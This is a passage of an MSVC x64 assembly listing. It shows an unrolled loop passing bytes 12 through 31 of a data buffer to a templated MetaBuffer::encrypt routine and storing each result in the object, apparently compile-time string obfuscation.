  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<47,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
